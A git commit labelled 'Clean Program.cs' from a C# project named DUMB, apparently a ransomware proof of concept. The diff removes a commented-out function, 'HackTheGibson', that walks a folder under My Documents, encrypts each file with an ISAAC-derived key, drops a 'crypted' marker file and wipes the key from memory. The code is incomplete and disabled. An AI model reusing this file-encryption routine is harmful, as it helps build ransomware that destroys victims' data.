75db8c60dbb36b15153413ab42b3290eb9b441ba
AlphaDelta <admin@skid.pro>
2015-08-21 16:27:51 +1200

    Clean Program.cs

--- DUMB/Program.cs
+++ DUMB/Program.cs
@@ -61,39 +61,5 @@ namespace DUMB
                 WinAPI.CloseDesktop(hNewDesktop);
             }
         }
-
-        static void HackTheGibson(bool decrypt = false)
-        {
-            //Grab the location for MyDocs (+ \TEST\ because this is a PoC), iterate files and crypt them
-            /*string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-
-            string folder = docs + @"\TEST\";
-
-            if (!Directory.Exists(folder))
-            {
-                MessageBox.Show("Put a folder in My Documents called 'TEST' and chuck any files you want to get fucked up in there and next time read the god damn README", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                return false;
-            }
-
-            if (!decrypt && File.Exists(folder + "crypted")) return true; //There's no way to know if the files are actually crypted or not, so we'll use a file
-
-            //Generate the key
-            ISAAC csprng = PassTheKeysBro();
-
-            string[] files = Directory.GetFiles(folder); //I'm not actually sure if foreach would execute this on each enumeration, I'll assume it does
-            foreach (string file in files)
-            {
-                if (Path.GetFileName(file) == "crypted") continue;
-                CryptFile(csprng, file);
-            }
-
-            if (!decrypt) File.Create(folder + "crypted").Close();
-            else if (File.Exists(folder + "crypted")) File.Delete(folder + "crypted");
-
-            for (int i = 0; i < ISAAC.SIZE; i++)
-                csprng.mem[i] = 0; //Zero out ISAAC so it's not in the memory
-
-            return true;*/
-        }
     }
 }
